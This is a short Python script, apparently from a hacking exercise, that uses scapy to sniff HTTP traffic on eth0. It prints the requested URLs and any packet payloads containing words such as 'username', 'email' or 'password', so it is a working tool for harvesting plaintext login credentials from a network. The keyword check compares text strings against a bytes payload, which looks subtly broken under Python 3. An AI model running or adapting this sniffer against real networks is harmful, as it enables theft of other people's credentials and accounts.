#!/usr/bin/env python3
# @Author - Avish Dhirawat
# Date - 13/08/2020

import scapy.all as scapy
from scapy.layers import http # Third party module to filter http requests

def sniff(interface):
    #scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet, filter = "port 80") # prn to run the given program whenever we get some packet.
    # Filter is used to filter the packets based on its type or port for eg :- tcp, arp, port 21, etc. Filter doesn't allow us to filter the http req.
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

def process_sniffed_packet(packet):
    #print(packet)
    if(packet.haslayer(http.HTTPRequest)): # haslayer function from module scapy.layers
        #print(packet.show())
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)

        if(packet.haslayer(scapy.Raw)): # Raw layer contains password and username (we can use any other layer also to extract other info)
            #print(packet[scapy.Raw].load) # Load is a field in layer Raw
            load = packet[scapy.Raw].load
            keywords = ['username', 'email', 'login', 'Email Id', 'user id', 'Userid', 'login id', 'password', 'pass', 'Password', 'Email Address', 'Login Id', 'Password', 'UserLogin', 'User', 'Username']
            #print(load)
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break;

sniff("eth0")
